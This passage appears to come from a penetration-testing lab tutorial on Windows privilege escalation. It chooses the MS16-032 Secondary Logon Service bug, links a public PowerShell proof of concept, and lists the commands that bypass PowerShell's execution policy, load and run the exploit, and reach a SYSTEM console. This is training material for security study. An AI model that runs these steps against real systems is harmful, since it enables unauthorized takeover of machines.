> Looking through the results, we can see a rather extensive list, some Metasploit modules, and some standalone PoC exploits. We must filter through the noise, remove any Denial of Service exploits, and exploits that do not make sense for our target OS. One that stands out immediately as interesting is MS16-032. A detailed explanation of this bug can be found in this [Project Zero blog post](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html) which is a bug in the Secondary Logon Service.

## Exploiting MS16-032 with PowerShell PoC

Let's use a [PowerShell PoC](https://www.exploit-db.com/exploits/39719) to attempt to exploit this and elevate our privileges.

```powershell-session
PS C:\htb> Set-ExecutionPolicy bypass -scope process
PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032
```

### Spawning a SYSTEM Console

```cmd-session
C:\htb> whoami

nt authority\system
```
